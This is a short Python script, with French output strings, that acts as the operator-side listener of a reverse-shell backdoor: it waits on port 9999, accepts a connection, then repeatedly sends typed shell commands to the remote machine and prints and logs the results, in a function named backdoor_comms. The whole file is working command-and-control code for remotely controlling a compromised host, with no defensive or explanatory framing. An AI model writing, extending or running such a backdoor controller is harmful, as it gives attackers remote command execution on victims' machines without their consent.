import socket
import logging

HOST = "127.0.0.1"
PORT = 9999
BUFFER = 1024
SEP = "<sep>"  

logging.basicConfig(filename="server_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

def backdoor_comms(conn):
    cwd = conn.recv(BUFFER).decode()
    logging.info(f"Répertoire courant reçu : {cwd}")
    print(f"Répertoire courant : {cwd}")
    
    while True:
        command = input(f"[SHELL] {cwd}$> ")
        if command.lower() == "exit":
            break
        conn.send(command.encode())
        output = conn.recv(BUFFER).decode()
        results, cwd = output.split(SEP)
        logging.info(f"Commande : {command}\nRésultat : {results}")
        print(f"Résultat : {results}")
        print(f"Nouveau répertoire : {cwd}")

def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((HOST, PORT))
    server_sock.listen(1)
    print(f"Serveur en écoute sur {HOST}:{PORT}")
    
    conn, addr = server_sock.accept()
    print(f"Connecté à {addr}")
    backdoor_comms(conn)
    conn.close()
    server_sock.close()

if __name__ == "__main__":
    main()